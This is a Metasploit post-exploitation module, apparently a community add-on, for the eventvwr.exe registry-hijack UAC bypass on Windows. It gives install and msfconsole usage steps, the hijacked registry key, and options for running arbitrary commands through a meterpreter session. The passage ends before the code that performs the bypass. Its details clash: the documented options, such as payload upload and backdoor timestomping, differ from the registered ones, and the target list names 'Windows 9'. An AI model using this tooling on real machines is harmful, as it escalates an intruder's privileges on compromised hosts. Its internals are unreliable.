##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Exploit Title  : enigma_fileless_uac_bypass.rb
# Module Author  : pedr0 Ubuntu [r00t-3xp10it]
# Vuln discover  : enigma0x3 | mattifestation
# Tested on      : Windows 7 | Windows 8 | Windows 10
# POC: https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/
#
#
# [ DESCRIPTION ]
#
#
#
# [ MODULE DEFAULT OPTIONS ]
# The session number to run this module on        => set SESSION 3
# The service name to be created (or query)       => set SERVICE_NAME MyService
# Input the payload name to be uploaded           => set PAYLOAD_NAME payload.exe
# The destination path were to deploy payload     => set DEPLOY_PATH %userprofile%
# The full path (local) of payload to be uploaded => set LOCAL_PATH /root/payload.exe
#
# [ MODULE ADVANCED OPTIONS ]
# Blank remote backdoor timestomp attributs?      => set BLANK_TIMESTOMP true
#
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/escalate/enigma_fileless_uac_bypass.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/escalate/enigma_fileless_uac_bypass.rb
# Manually Path Search: root@kali:~# locate modules/post/windows/escalate
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/windows/escalate/enigma_fileless_uac_bypass
# msf post(enigma_fileless_uac_bypass) > info
# msf post(enigma_fileless_uac_bypass) > show options
# msf post(enigma_fileless_uac_bypass) > show advanced options
# msf post(enigma_fileless_uac_bypass) > set [option(s)]
# msf post(enigma_fileless_uac_bypass) > exploit
##



# ----------------------------
# Module Dependencies/requires
# ----------------------------
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'



# ----------------------------------
# Metasploit Class name and includes
# ----------------------------------
class MetasploitModule < Msf::Post
      Rank = GreatRanking
 
         include Msf::Post::Common
         include Msf::Post::Windows::Priv
         include Msf::Post::Windows::Error



# -----------------------------------------
# Building Metasploit/Armitage info GUI/CLI
# -----------------------------------------
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'enigma0x3 fileless uac bypass [RCE]',
                        'Description'   => %q{
                                        To demonstrate this attack, Matt Graeber (@mattifestation) and enigma0x3 constructed a PowerShell script that, when executed on a system, will create the required registry entry in the current user’s hive (HKCU\Software\Classes\mscfile\shell\open\command), set the default value to whatever you pass via the -Command parameter, run eventvwr.exe.
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: pedr0 Ubuntu [r00t-3xp10it]', # post-module author
                                        # 'SpecialThanks: Fatima Ferreira | Chaitanya', # collaborators
                                ],
 
                        'Version'        => '$Revision: 1.0',
                        'DisclosureDate' => 'jan 2 2017',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false', # thats no need for privilege escalation..
                        'Targets'        =>
                                [
                                         # Tested againts windows 7 (build 7600/7601) SP 1 | XP SP1 (32 bits)
                                         [ 'Windows XP', 'Windows VISTA', 'Windows 7', 'Windows 8', 'Windows 9', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '3', # default its to run againts windows 7 (build 7600)
                        'References'     =>
                                [
                                         [ 'URL', 'goo.gl/XHQ6aF' ],
                                         [ 'URL', 'http://sourceforge.net/users/peterubuntu10' ],
                                         [ 'URL', 'http://sourceforge.net/projects/msf-auxiliarys/repository' ]


                                ],
			'DefaultOptions' =>
				{
                                         'SESSION' => '1', # Default its to run againts session 1
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('CMD_COMMAND', [ false, 'The cmd command to be executed (eg cmd.exe /c <command>)']),
                                OptBool.new('DEL_REGKEY', [ false, 'Delete malicious service?' , false])
                        ], self.class)

        end


